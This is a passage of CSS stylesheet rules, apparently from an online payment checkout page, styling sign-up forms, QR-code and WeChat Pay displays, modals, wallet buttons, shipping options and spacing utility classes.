            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            transition: box-shadow 0.08s ease-in, color 0.08s ease-in, filter 50000s;
            background-color: #fff;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            border-radius: 6px;
        }

        .is-darkMode .SignUpForm-container {
            background: linear-gradient(0deg, hsla(0, 0%, 100%, 0.08), hsla(0, 0%, 100%, 0.08)), #000;
            box-shadow: 0 0 0 1px #232323;
            color: #fff;
        }

        .SignUpForm-checkboxContainer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            -webkit-box-align: start;
            -webkit-align-items: flex-start;
            -ms-flex-align: start;
            align-items: flex-start;
            padding: 12px;
            background-color: #fff;
            border-radius: 6px;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .App-Container.is-squareBordered .SignUpForm-checkboxContainer {
            border-radius: 0;
        }

        .App-Container.App-Container.is-veryRoundBordered .SignUpForm-checkboxContainer {
            border-radius: 18px;
        }

        .SignUpForm-checkboxContainer--checked {
            border-bottom-left-radius: 0;
            border-bottom-right-radius: 0;
        }

        .SignUpForm-container .PhoneNumberInput {
            padding: 20px 0;
        }

        .SignUpForm-phoneInput {
            border-bottom-left-radius: 6px;
            border-bottom-right-radius: 6px;
        }

        .FormFieldCheckbox.SignUpForm-checkbox {
            margin-top: -2px;
        }

        .SignUpForm-checkbox .Checkbox-InputContainer {
            top: 3px;
        }

        .SignUpForm-checkbox .Checkbox-Label {
            font-size: 14px;
            font-weight: 400;
            color: rgba(26, 26, 26, 0.9);
        }

        .SignUpForm-checkbox .SignUpForm-subLabel {
            color: rgba(26, 26, 26, 0.4);
            font-size: 13px;
            margin-top: 4px;
        }

        .SignUpForm-footer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .SignUpForm-footer svg {
            fill: rgba(26, 26, 26, 0.5);
        }

        .SignUpForm-footer .Text:after {
            content: "\2022";
            margin: 0 8px;
            color: rgba(26, 26, 26, 0.3);
        }

        .App-Container.App-Container.is-veryRoundBordered .SignUpForm-checkboxContainer--checked {
            border-radius: 18px 18px 0 0;
        }

        .App-Container.is-veryRoundBordered .SignUpForm .CheckoutInput {
            border-radius: 0 0 18px 18px;
        }

        @media only screen and (min-width: 992px) {
            .SignUpForm-checkboxContainer {
                padding-top: 8px;
                padding-bottom: 8px;
            }
        }

        .UpdateCardCheckbox .Icon {
            margin-bottom: -1px;
            color: rgba(26, 26, 26, 0.5);
        }

        .UpdateCardCheckbox-infoTooltip .Tooltip-Text {
            max-width: 330px;
            width: 330px;
        }

        .CardPayment-readOnlyFormLabel h3 {
            display: inline-block;
        }

        .CardPayment-signUpFormContainer {
            margin-top: 8px;
        }

        .CardPayment-signUpFormContainer.CardPayment-signUpFormContainer--hidden {
            margin: 0;
            padding: 0;
        }

        @-webkit-keyframes keyframes {
            0% {
                background-position: 200%;
            }
            to {
                background-position: 0;
            }
        }

        @keyframes keyframes {
            0% {
                background-position: 200%;
            }
            to {
                background-position: 0;
            }
        }

        .Skeleton {
            background-image: linear-gradient(90deg, #f7fafc 50%, #f0f3f7 80%, #f7fafc);
            background-size: 200% 100%;
            -webkit-animation-name: keyframes;
            animation-name: keyframes;
            -webkit-animation-timing-function: ease-in-out;
            animation-timing-function: ease-in-out;
            -webkit-animation-iteration-count: infinite;
            animation-iteration-count: infinite;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
        }

        .LinkButton {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
        }

        .LinkButton_Label {
            text-align: center;
            width: 100%;
        }

        .JPCreditTransfer--instructions {
            margin-bottom: 12px;
        }

        .JPCreditTransfer--footer {
            margin-top: 12px;
        }

        .SavedInfoSummary-cardNumber {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .SavedInfoSummary-cardNumber--expired {
            opacity: 0.5;
        }

        .ReadOnlyFormField-action button {
            transition: color 0.1s ease-out;
        }

        .SavedInfoSummary-logOut {
            color: rgba(26, 26, 26, 0.9);
        }

        .SavedInfoSummary-enterPhoneNumberText {
            display: inline-block;
            padding-bottom: 4px;
        }

        .SavedInfoSummary--white .ReadOnlyForm {
            background-color: #fff;
        }

        .TaxIdCollection-Container {
            clear: both;
        }

        .TaxIdCollection-TooltipContext {
            margin-left: 4px;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-transform: translateY(2px);
            -ms-transform: translateY(2px);
            transform: translateY(2px);
        }

        .QRCode-scanner {
            position: absolute;
            opacity: 0;
            margin: -8px -40px;
            width: 208px;
            height: 2px;
            background: linear-gradient(1turn, #ffd80a, #ffed8e);
            box-shadow: 0 2px 20px #ffd80a;
            -webkit-animation: scanner 3s ease 4s infinite;
            animation: scanner 3s ease 4s infinite;
        }

        .QRCode-scanned {
            background: hsla(0, 0%, 100%, 0.3);
            width: 100%;
            height: 0%;
            position: absolute;
            top: 0;
            right: 0;
            -webkit-animation: scanned 3s ease 4s infinite;
            animation: scanned 3s ease 4s infinite;
        }

        .QRCode-spinner {
            position: absolute;
            left: calc(50% - 8px);
            top: calc(50% - 8px);
        }

        .QRCode-uninitialized {
            position: absolute;
            left: calc(50% - 12px);
            top: calc(50% - 12px);
        }

        .QRCode {
            background: #fff;
            border-radius: 6px;
            padding: 6px;
            position: relative;
        }

        .QRCode-imageContainer {
            display: block;
            width: 128px;
            height: 128px;
        }

        .QRCode-image {
            width: 100%;
            height: 100%;
            transition: opacity, -webkit-filter;
            transition: filter, opacity;
            transition: filter, opacity, -webkit-filter;
            transition-duration: 1s;
            opacity: 1;
            -webkit-filter: blur(0);
            filter: blur(0);
            -ms-interpolation-mode: nearest-neighbor;
            image-rendering: -webkit-optimize-contrast;
            image-rendering: -moz-crisp-edges;
            image-rendering: pixelated;
        }

        .QRCode-image--blurred {
            -webkit-filter: blur(4px);
            filter: blur(4px);
            opacity: 0.2;
        }

        .QRCodeDisplay {
            padding: 32px;
            background-color: rgba(0, 0, 0, 0.03);
            border-radius: 12px;
            overflow: hidden;
        }

        .QRCodeDisplay-Container {
            padding: 12px;
            box-shadow: 0 0 0 1px hsla(0, 0%, 68.6%, 0.2), 0 15px 35px 0 rgba(49, 49, 93, 0.08), 0 5px 15px 0 rgba(0, 0, 0, 0.06);
            border-radius: 12px;
        }

        .QRCodeDisplay-Logo {
            margin-right: 6px;
        }

        .QRCodePollingState-backLink {
            margin-top: 24px;
            font-size: 14px;
        }

        @-webkit-keyframes scanner {
            0% {
                opacity: 0;
                -webkit-transform: scaleX(0) translateY(0);
                transform: scaleX(0) translateY(0);
            }
            15% {
                opacity: 1;
                -webkit-transform: scaleX(1.05) translateY(0);
                transform: scaleX(1.05) translateY(0);
            }
            18% {
                -webkit-transform: scaleX(1) translateY(0);
                transform: scaleX(1) translateY(0);
            }
            50% {
                -webkit-transform: scaleX(1) translateY(140px);
                transform: scaleX(1) translateY(140px);
                opacity: 1;
            }
            60%,
            to {
                opacity: 0;
                -webkit-transform: scaleX(0) translateY(140px);
                transform: scaleX(0) translateY(140px);
            }
        }

        @keyframes scanner {
            0% {
                opacity: 0;
                -webkit-transform: scaleX(0) translateY(0);
                transform: scaleX(0) translateY(0);
            }
            15% {
                opacity: 1;
                -webkit-transform: scaleX(1.05) translateY(0);
                transform: scaleX(1.05) translateY(0);
            }
            18% {
                -webkit-transform: scaleX(1) translateY(0);
                transform: scaleX(1) translateY(0);
            }
            50% {
                -webkit-transform: scaleX(1) translateY(140px);
                transform: scaleX(1) translateY(140px);
                opacity: 1;
            }
            60%,
            to {
                opacity: 0;
                -webkit-transform: scaleX(0) translateY(140px);
                transform: scaleX(0) translateY(140px);
            }
        }

        @-webkit-keyframes scanned {
            18% {
                height: 0%;
                opacity: 1;
            }
            50% {
                height: 100%;
                opacity: 1;
            }
            60%,
            to {
                height: 100%;
                opacity: 0;
            }
        }

        @keyframes scanned {
            18% {
                height: 0%;
                opacity: 1;
            }
            50% {
                height: 100%;
                opacity: 1;
            }
            60%,
            to {
                height: 100%;
                opacity: 0;
            }
        }

        .WeChatPayQRCode-scanner {
            position: absolute;
            opacity: 0;
            margin: -8px -40px;
            width: 208px;
            height: 2px;
            background: linear-gradient(1turn, #ffd80a, #ffed8e);
            box-shadow: 0 2px 20px #ffd80a;
            -webkit-animation: scanner 3s ease 4s infinite;
            animation: scanner 3s ease 4s infinite;
        }

        .WeChatPayQRCode-scanned {
            background: hsla(0, 0%, 100%, 0.3);
            width: 100%;
            height: 0%;
            position: absolute;
            top: 0;
            right: 0;
            -webkit-animation: scanned 3s ease 4s infinite;
            animation: scanned 3s ease 4s infinite;
        }

        .WeChatPayQRCode-spinner {
            position: absolute;
            left: calc(50% - 8px);
            top: calc(50% - 8px);
        }

        .WeChatPayQRCode-uninitialized {
            position: absolute;
            left: calc(50% - 12px);
            top: calc(50% - 12px);
        }

        .WeChatPayQRCode {
            background: #fff;
            border-radius: 6px;
            padding: 12px;
            position: relative;
        }

        .WeChatPayQRCode-imageContainer {
            display: block;
            width: 128px;
            height: 128px;
        }

        .WeChatPayQRCode-image {
            width: 100%;
            height: 100%;
            transition: opacity, -webkit-filter;
            transition: filter, opacity;
            transition: filter, opacity, -webkit-filter;
            transition-duration: 1s;
            opacity: 1;
            -webkit-filter: blur(0);
            filter: blur(0);
            -ms-interpolation-mode: nearest-neighbor;
            image-rendering: -webkit-optimize-contrast;
            image-rendering: -moz-crisp-edges;
            image-rendering: pixelated;
        }

        .WeChatPayQRCode-image--blurred {
            -webkit-filter: blur(5px);
            filter: blur(5px);
            opacity: 0.2;
        }

        .p0 {
            padding: 0;
        }

        .p1 {
            padding: 4px;
        }

        .py1 {
            padding-top: 4px;
            padding-bottom: 4px;
        }

        .px1 {
            padding-left: 4px;
            padding-right: 4px;
        }

        .p2 {
            padding: 8px;
        }

        .py2 {
            padding-top: 8px;
            padding-bottom: 8px;
        }

        .px2 {
            padding-left: 8px;
            padding-right: 8px;
        }

        .p3 {
            padding: 12px;
        }

        .py3 {
            padding-top: 12px;
            padding-bottom: 12px;
        }

        .px3 {
            padding-left: 12px;
            padding-right: 12px;
        }

        .p4 {
            padding: 16px;
        }

        .py4 {
            padding-top: 16px;
            padding-bottom: 16px;
        }

        .px4 {
            padding-left: 16px;
            padding-right: 16px;
        }

        .p5 {
            padding: 24px;
        }

        .py5 {
            padding-top: 24px;
            padding-bottom: 24px;
        }

        .px5 {
            padding-left: 24px;
            padding-right: 24px;
        }

        .p6 {
            padding: 32px;
        }

        .py6 {
            padding-top: 32px;
            padding-bottom: 32px;
        }

        .px6 {
            padding-left: 32px;
            padding-right: 32px;
        }

        .m0 {
            margin: 0;
        }

        .mt0 {
            margin-top: 0;
        }

        .mr0 {
            margin-right: 0;
        }

        .mb0 {
            margin-bottom: 0;
        }

        .ml0,
        .mx0 {
            margin-left: 0;
        }

        .mx0 {
            margin-right: 0;
        }

        .my0 {
            margin-top: 0;
            margin-bottom: 0;
        }

        .m1 {
            margin: 4px;
        }

        .mt1 {
            margin-top: 4px;
        }

        .mr1 {
            margin-right: 4px;
        }

        .mb1 {
            margin-bottom: 4px;
        }

        .ml1,
        .mx1 {
            margin-left: 4px;
        }

        .mx1 {
            margin-right: 4px;
        }

        .my1 {
            margin-top: 4px;
            margin-bottom: 4px;
        }

        .m2 {
            margin: 8px;
        }

        .mt2 {
            margin-top: 8px;
        }

        .mr2 {
            margin-right: 8px;
        }

        .mb2 {
            margin-bottom: 8px;
        }

        .ml2,
        .mx2 {
            margin-left: 8px;
        }

        .mx2 {
            margin-right: 8px;
        }

        .my2 {
            margin-top: 8px;
            margin-bottom: 8px;
        }

        .m3 {
            margin: 12px;
        }

        .mt3 {
            margin-top: 12px;
        }

        .mr3 {
            margin-right: 12px;
        }

        .mb3 {
            margin-bottom: 12px;
        }

        .ml3,
        .mx3 {
            margin-left: 12px;
        }

        .mx3 {
            margin-right: 12px;
        }

        .my3 {
            margin-top: 12px;
            margin-bottom: 12px;
        }

        .m4 {
            margin: 16px;
        }

        .mt4 {
            margin-top: 16px;
        }

        .mr4 {
            margin-right: 16px;
        }

        .mb4 {
            margin-bottom: 16px;
        }

        .ml4,
        .mx4 {
            margin-left: 16px;
        }

        .mx4 {
            margin-right: 16px;
        }

        .my4 {
            margin-top: 16px;
            margin-bottom: 16px;
        }

        .m5 {
            margin: 24px;
        }

        .mt5 {
            margin-top: 24px;
        }

        .mr5 {
            margin-right: 24px;
        }

        .mb5 {
            margin-bottom: 24px;
        }

        .ml5,
        .mx5 {
            margin-left: 24px;
        }

        .mx5 {
            margin-right: 24px;
        }

        .my5 {
            margin-top: 24px;
            margin-bottom: 24px;
        }

        .m6 {
            margin: 32px;
        }

        .mt6 {
            margin-top: 32px;
        }

        .mr6 {
            margin-right: 32px;
        }

        .mb6 {
            margin-bottom: 32px;
        }

        .ml6,
        .mx6 {
            margin-left: 32px;
        }

        .mx6 {
            margin-right: 32px;
        }

        .my6 {
            margin-top: 32px;
            margin-bottom: 32px;
        }

        .mxn1 {
            margin-left: -4px;
            margin-right: -4px;
        }

        .mxn2 {
            margin-left: -8px;
            margin-right: -8px;
        }

        .mxn3 {
            margin-left: -12px;
            margin-right: -12px;
        }

        .mxn4 {
            margin-left: -16px;
            margin-right: -16px;
        }

        .mxn5 {
            margin-left: -24px;
            margin-right: -24px;
        }

        .mxn6 {
            margin-left: -32px;
            margin-right: -32px;
        }

        .ml-auto {
            margin-left: auto;
        }

        .mr-auto,
        .mx-auto {
            margin-right: auto;
        }

        .mx-auto {
            margin-left: auto;
        }

        .mb-2px {
            margin-bottom: 2px;
        }

        .WeChatPay {
            padding: 32px;
            background-color: rgba(0, 0, 0, 0.03);
            border-radius: 12px;
            overflow: hidden;
        }

        .WeChatPay-Container {
            padding: 12px;
            background: #65bf46;
            box-shadow: 0 0 0 1px hsla(0, 0%, 68.6%, 0.2), 0 15px 35px 0 rgba(49, 49, 93, 0.08), 0 5px 15px 0 rgba(0, 0, 0, 0.06);
            border-radius: 12px;
        }

        .WeChatPay-Logo {
            margin-right: 6px;
        }

        .LinkPaymentMethodAccordionItem--recollecting .AccordionItemCover-header {
            display: block;
        }

        .LinkPaymentMethodAccordionItem--recollecting .AccordionItemCover-label {
            margin-bottom: 16px;
        }

        .RedactedCardNumber--expired {
            opacity: 0.5;
        }

        .LinkPaymentMethodAccordionItem .LinkBillingAccordionItem {
            margin: 4px -16px -20px;
            border-top: 1px solid rgba(26, 26, 26, 0.1) !important;
        }

        .LinkPaymentMethodAccordionItem--recollecting .LinkBillingAccordionItem {
            margin-top: 16px;
        }

        .LinkRemoveSavedPaymentModal {
            width: 100%;
            max-width: 305px;
            padding: 24px;
            text-align: center;
        }

        .LinkRemoveSavedPaymentModal-overlay {
            background: rgba(0, 0, 0, 0.2);
        }

        .LinkRemoveSavedPaymentModal-button {
            width: 100%;
            padding-top: 12px;
            padding-bottom: 12px;
        }

        .LinkRemoveSavedPaymentModal-button:disabled {
            background-color: rgba(0, 0, 0, 0.03);
        }

        .LinkRemoveSavedPaymentModal-button .Spinner {
            margin-top: -1px;
            margin-bottom: -1px;
        }

        .LinkShippingAccordionItem .LinkPhoneNumberAccordionItem {
            margin: 4px -16px -20px;
            border-top: 1px solid rgba(26, 26, 26, 0.1) !important;
        }

        .LinkPaymentForm .AccordionButton {
            opacity: 1;
            transition: opacity 0.2s ease;
        }

        .LinkPaymentForm--disabled .AccordionButton {
            opacity: 0.3;
            pointer-events: none;
        }

        .LogoutModal-modalOverlay {
            opacity: 0;
            background-color: rgba(0, 0, 0, 0.2);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            transition: opacity 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .LogoutModal-modalOverlay.ModalOverlay--afterOpen {
            opacity: 1;
        }

        .LogoutModal-modalOverlay.ModalOverlay--beforeClose {
            opacity: 0;
            transition: opacity 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .LogoutModal-modal {
            background-color: #fff;
            -webkit-backdrop-filter: blur(40px);
            backdrop-filter: blur(40px);
            border-radius: 8px;
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.2), 0 6px 12px rgba(0, 0, 0, 0.03);
            width: 100%;
            max-width: 305px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            padding: 24px 20px 20px;
            font-size: 14px;
            letter-spacing: -0.15px;
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
            transition: -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .ModalContent--is-veryRoundBordered.LogoutModal-modal {
            border-radius: 18px;
        }

        .ModalContent--is-squareBordered.LogoutModal-modal {
            border-radius: 0;
        }

        .LogoutModal-modal.ModalContent--afterOpen {
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
        }

        .LogoutModal-modal.ModalContent--beforeClose {
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
            transition: -webkit-transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .LogoutModal-headline {
            margin-bottom: 8px;
        }

        .LogoutModal-info {
            margin-bottom: 16px;
            text-align: center;
        }

        .LogoutModal-buttonGroup {
            width: 100%;
            margin-top: 8px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
        }

        .LogoutModal-button {
            padding: 12px;
            width: 100%;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
        }

        .LogoutModal-button:first-child {
            margin-right: 8px;
        }

        .LogoutModal-closeButton:hover {
            background-color: rgba(26, 26, 26, 0.05);
        }

        .LogoutModal-closeButton:active {
            background-color: rgba(0, 0, 0, 0.075);
            -webkit-transform: scale(0.98);
            -ms-transform: scale(0.98);
            transform: scale(0.98);
        }

        .FakeWalletButton {
            height: 44px;
            border: 0;
            border-radius: 6px;
            cursor: pointer;
            background-color: #000;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            margin-bottom: 16px;
        }

        .FakeWalletButton--googlePay svg {
            -webkit-transform: scale(1.2);
            -ms-transform: scale(1.2);
            transform: scale(1.2);
        }

        .PaymentRequestButtonContainer > button {
            height: 44px;
            width: 100%;
        }

        .PaymentRequestButtonContainer.StripeElement--focus {
            z-index: 2;
            outline: none;
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
            border-radius: 6px;
        }

        .PaymentRequestOrHeader {
            position: relative;
        }

        .ButtonAndDividerContainer,
        .PaymentHeaderContainer {
            width: 100%;
        }

        .ButtonAndDividerContainer .PaymentRequestButtonContainer {
            margin-bottom: 16px;
        }

        .PaymentHeader {
            padding-bottom: 16px;
        }

        .ButtonAndDividerContainer .Divider {
            padding-top: 16px;
            padding-bottom: 32px;
        }

        .is-fontFamily--Inconsolata .PaymentRequestOrHeader .Divider .Text,
        .is-fontFamily--PTSans .PaymentRequestOrHeader .Divider .Text,
        .is-fontFamily--TitilliumWeb .PaymentRequestOrHeader .Divider .Text {
            font-size: 15px;
        }

        .RadioButton {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            display: inline-block;
            width: 12px;
            height: 12px;
            padding: 2px;
            background-clip: content-box;
            border: 1px solid rgba(26, 26, 26, 0.4);
            background-color: transparent;
            border-radius: 50%;
        }

        .RadioButton:checked {
            background-color: #0074d4;
            border-color: #0074d4;
        }

        .ShippingSelector-item-label {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            cursor: pointer;
        }

        .ShippingSelector-name {
            margin-left: 0.5em;
        }

        .ShippingSelector-display-name {
            margin-right: 0.5em;
        }

        .ShippingSelector-price {
            margin-left: auto;
        }

        .ShippingSelector-input-container.CheckoutInput {
            height: auto;
            line-height: 1.125;
        }

        .ShippingSelector-radio {
            margin-top: 2px;
        }

        .ShippingSelector-option__selected .ShippingSelector-radio,
        .ShippingSelector-radio {
            transition: border-color 0.2s ease, background-color 0.2s ease;
        }

        @media only screen and (max-width: 991.98px) {
            .ShippingSelector-radio {
                margin-top: 4px;
            }
        }

        @media only screen and (min-width: 992px) {
            .App-Container:not(.App-Container--setupMode) .CheckoutInput.ShippingSelector-input-container {
                height: auto;
            }
        }

        .MandateModal-modalOverlay {
            opacity: 0;
            background-color: rgba(0, 0, 0, 0.2);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            transition: opacity 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .MandateModal-modalOverlay.ModalOverlay--afterOpen {
            opacity: 1;
        }

        .MandateModal-modalOverlay.ModalOverlay--beforeClose {
            opacity: 0;
            transition: opacity 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .MandateModal-modal.ModalContent--afterOpen {
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
        }

        .MandateModal-modal.ModalContent--beforeClose {
            transition: -webkit-transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .MandateModal-modal,
        .MandateModal-modal.ModalContent--beforeClose {
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
        }

        .MandateModal-modal {
            background-color: #fff;
            -webkit-backdrop-filter: blur(40px);
            backdrop-filter: blur(40px);
            border-radius: 8px;
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.2), 0 6px 12px rgba(0, 0, 0, 0.03);
            width: 100%;
            max-width: 360px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            padding: 24px 20px 20px;
            font-size: 14px;
            letter-spacing: -0.15px;
            transition: -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .MandateModal-accountInformation,
        .MandateModal-contactInformation,
        .MandateModal-headline,
        .MandateModal-mandateTerms {
            margin-bottom: 16px;
        }

        .MandateModal-accountInformation .Text,
        .MandateModal-contactInformation .Text {
            margin-bottom: 4px;
        }

        .MandateModal-modal .accountRow {
            background-color: #f7f7f7;
            border-radius: 6px;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            overflow: hidden;
            margin: 4px 0;
        }

        .MandateModal-modal .bankIcon {
            width: 24px;
            height: 24px;
            left: 0;
            right: 0;
            border-radius: 4px;
            margin: 10px 8px 10px 12px;
        }

        .MandateModal-modal .fullAccountDetail {
            padding: 14px 0;
            margin-bottom: 0;
        }

        .MandateModal-mandateTerms {
            text-align: center;
        }

        .MandateModal-buttonGroup {
            width: 100%;
            margin-top: 8px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
        }

        .MandateModal-button {
            padding: 12px;
            width: 100%;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
        }

        .MandateModal-button:first-child {
            margin-right: 8px;
        }

        .App-Global-Fields {
            margin-bottom: 8px;
        }

        .PaymentMethod-Heading {
            margin-top: 12px;
        }

        .ShippingDetails-Heading {
            margin-top: 0;
        }

        .PaymentForm-paymentMethodForm .ShippingDetails-Heading {
            margin-top: 12px;
        }

        .Tabs-TabListItem#wechat_pay-tab .Tabs-TabListItemContent svg {
            -webkit-filter: none;
            filter: none;
        }

        .PaymentForm-confirmPaymentContainer {
            margin-top: 16px;
        }

        .is-fontFamily--Inconsolata .PaymentForm-confirmPaymentContainer .PolicyHighlight-container .Text,
        .is-fontFamily--PTSans .PaymentForm-confirmPaymentContainer .PolicyHighlight-container .Text,
        .is-fontFamily--TitilliumWeb .PaymentForm-confirmPaymentContainer .PolicyHighlight-container .Text {
            font-size: 13px;
        }

        @media only screen and (min-width: 992px) {
            .PaymentFormFixedHeightContainer {
                min-height: 400px;
            }
        }

        @media only screen and (max-width: 991.98px) {
            .CheckoutPaymentForm .PaymentHeader {
                display: none;
            }
        }

        .CrossSellOffer {
            margin-top: 28.5px;
        }

        .CrossSellOffer.has-productSummaryImage {
            margin-top: 12px;
        }

        .CrossSellOffer.is-added {
            margin-top: 16px;
        }

        .CrossSellOffer-clickContainer {
            cursor: pointer;
            width: 100%;
        }

        .CrossSellOffer-container {
            width: calc(100% + 32px);
            position: relative;
            left: -16px;
            border: 1px solid rgba(26, 26, 26, 0.1);
            padding: 16px;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            background-color: rgba(26, 26, 26, 0.05);
            border-bottom-left-radius: 6px;
            border-bottom-right-radius: 6px;
        }

        .CrossSellOffer-header {
            border-top-left-radius: 6px;
            border-top-right-radius: 6px;
            border: 1px solid rgba(26, 26, 26, 0.1);
            border-bottom: none;
            width: calc(100% + 32px);
            -webkit-box-pack: start;
            -webkit-justify-content: flex-start;
            -ms-flex-pack: start;
            justify-content: flex-start;
        }

        .CrossSellOffer-headerFlexItem {
            padding: 8px 0;
        }

        .CrossSellOffer-headerText {
            margin-left: 16px;
        }

        .CrossSellOffer-imageContainer {
            width: 42px;
            height: 42px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .CrossSellOffer-image {
            max-width: 100%;
            max-height: 100%;
            border-radius: 4px;
        }

        .CrossSellOffer-addRemove {
            white-space: nowrap;
        }

        .App-Container.is-squareBordered .CrossSellOffer-image {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .CrossSellOffer-image {
            border-radius: 18px;
        }

        .CrossSellOffer.is-added .CrossSellOffer-addRemove:before {
            display: inline-block;
            content: "\D7";
            margin-right: 4px;
        }

        .App-Container.is-darkBackground .CrossSellOffer-container {
            background-color: hsla(0, 0%, 100%, 0.05);
